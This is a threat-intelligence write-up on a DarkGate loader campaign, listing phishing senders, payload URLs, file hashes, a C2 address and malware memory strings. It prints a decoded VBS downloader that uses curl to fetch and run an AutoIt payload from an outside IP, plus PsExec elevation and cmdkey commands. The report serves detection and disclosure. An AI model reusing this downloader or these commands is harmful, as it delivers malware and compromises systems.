THREAT IDENTIFICATION:  DARKGATE LOADER

SUBJECTS OBSERVED
Subject was from a previously stolen email thread.

SENDERS OBSERVED
cristian.carrasco@decorativaeindustrial.cl

"404 TDS" URL
https://acwapower.ma/vbe7u

REDIRECT URL
https://gestionhqse.com/wzx/

INITIAL PAYLOAD DOWNLOAD URL
https://alianzasuma.com/wzx/

INITIAL PAYLOAD FILE HASH
data_win_version_24_jul_4223176.exe
167ff8009ae2942c6dc79fd6b8011772

SECONDARY PAYLOAD LOCATION (From a string in memory)
https://textbin.net/raw/gddv0ctwn3

SECONDARY PAYLOAD DOWNLOAD URL (The root is an OpenDir)
http://162.243.71.6/no_halt_7891.msi

SECONDARY PAYLOAD FILE HASH
no_halt_7891.msi
394f500a708c457b2a5eb4e839896c22

DARKGATE C2
http://80.66.88.145:7891/

ADDITIONAL MSI FILE HASHES (FROM OPENDIR)
11783495dbc74eff1e2131be6291955b
142a5ee6c92965f598a387e0cdb9daa8
394f500a708c457b2a5eb4e839896c22
5fe39a3f478df7f9400d18e39ae61983
608521a573ca80a1ba6e08a79dd9b899
6cdc6d318a697ca398107d9d9f94f81e
a3ae369339bf6213f0015ce0cfe4c5ee
de6f10ffc29209e55ebefa70f30799ba
fcdbc290465558d738df40feeae2559b

VBS FILE HASH (FROM OPENDIR)
downloader.vbs
1e461c915a389ded3aa47e1ad7cdb2aa

VBS FILE CONTENTS (after a simple find/replace of "sq" with "", the .vbs file decodes to the following)
yPVtlbayxek = Replace("Shell.Application","","")
yPVtlbayxeks = Replace("cmd","","")
yPVtlbayxekss = Replace("/c mkdir c:\hitp & cd /d c:\hitp & copy c:\windows\system32\curl.exe hitp.exe & hitp -o Autoit3.exe http://80.66.88.145:2351 & hitp -o aFbxxz.au3 http://80.66.88.145:2351/msiorbxthbp & Autoit3.exe aFbxxz.au3","","")
CreateObject(yPVtlbayxek).ShellExecute yPVtlbayxeks, yPVtlbayxekss ,"","",0
on error resume next
on error resume next:on error resume next
WScript.Quit
MsgBox "test":MsgBox "test"
'VVVV

ADDITIONAL REFERENCES
https://www.fortinet.com/blog/threat-research/enter-the-darkgate-new-cryptocurrency-mining-and-ransomware-campaign
https://www.zerofox.com/blog/the-underground-economist-volume-3-issue-12/
https://app.any.run/tasks/164b6bab-ef83-4b41-980f-b9ad55af5285/

ADDITIONAL STRINGS IN MEMORY
 /c cmdkey /generic:"127.0.0.2" /user:"SafeMode" /pass:"darkgatepassword0"
c:\temp\d.txt
c:\temp\t.txt
c:\temp\p.txt
c:\temp\crash.txt
DarkGate has recovered from a Critical error
____padoru____
-accepteula -d -u 
hvnc error
ventanas.txt
Reverse Shell Error: 
C:\temp\tskm
:9000 -u 0xDark 
sqlite3.dll
Updating by DLL method... Bytes: 
 Hash Data Update: 
No startup configured, skip update
Restart Failure 
Updating by AU3 method... Bytes: 
 Hash Data Update: 
Update Failure 
Incorrect data bytes: 
No startup configured, skip update
AppData\Local\Temp
I need Admin rights to elevate to SYSTEM
Already Elevated to SYSTEM
c:\temp\PsExec.exe
/c c:\temp\PsExec.exe -accepteula -i -d -s 
SYSTEM Elevation: Completed, new DarkGate connection with SYSTEM privileges, Executed from: 
Elevation: I already have admin rights
c:\temp\Autoit3.exe
Elevation: Cannot find Autoit3.exe
Elevation: AT RAW STUB ELEVATION IS NOT AVAILABLE




